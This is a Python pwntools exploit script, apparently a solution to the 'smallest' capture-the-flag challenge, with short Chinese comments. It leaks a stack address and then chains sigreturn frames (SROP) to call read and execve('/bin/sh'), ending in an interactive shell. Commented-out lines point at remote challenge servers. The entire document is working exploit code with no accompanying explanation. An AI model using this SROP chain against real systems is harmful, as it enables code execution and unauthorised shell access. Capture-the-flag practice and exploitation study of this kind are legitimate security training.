from pwn import *

io = process('./smallest')
#io = remote('ephemerally.top',28031)
#io = remote('210.30.97.133',28020)
#io = remote('node4.buuoj.cn',27817)
#context.log_level = 'debug'
context.arch = 'amd64'

start_addr = 0x4000B0
syscall_ret_addr = 0x4000BE

payload = p64(start_addr) * 3
io.send(payload)
raw_input('>wait to input 0x3b')
io.send(b'\xb3')
stack_addr = u64(io.recv()[8:16])
log.success('leak stack addr :' + hex(stack_addr))

# 写/bin/sh 返回到 
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0  
sigframe.rsi = stack_addr # 这里还是从栈顶开始，直接写下一次rop需要的内容
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret_addr
#sigframe.rbp = start_addr

# 泄漏完stack后调用sys_read 时，送的payload，
payload = p64(start_addr) + b'a' * 8 + bytes(sigframe)
raw_input('>wait to send first sgfram ')
io.send(payload)

raw_input('>wait to input 0xf bytes ')
send_15bytes = p64(syscall_ret_addr) + b'a' * 7
io.send(send_15bytes)

# 发送下一次ROP的内容以及binsh字符串给栈顶
raw_input('wait to send binsh>')
frame = SigreturnFrame() # execve
frame.rax = constants.SYS_execve
frame.rdi = stack_addr + 0x120
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr
frame.rip = syscall_ret_addr

binsh = p64(start_addr) + b'a' * 8 + bytes(frame)
binsh = binsh.ljust(0x120,b'\x00')
binsh += b'/bin/sh\x00'
io.send(binsh)

raw_input('>wait to input 0xf bytes ')
send_15bytes = p64(syscall_ret_addr) + b'a' * 7
io.send(send_15bytes)

io.interactive()

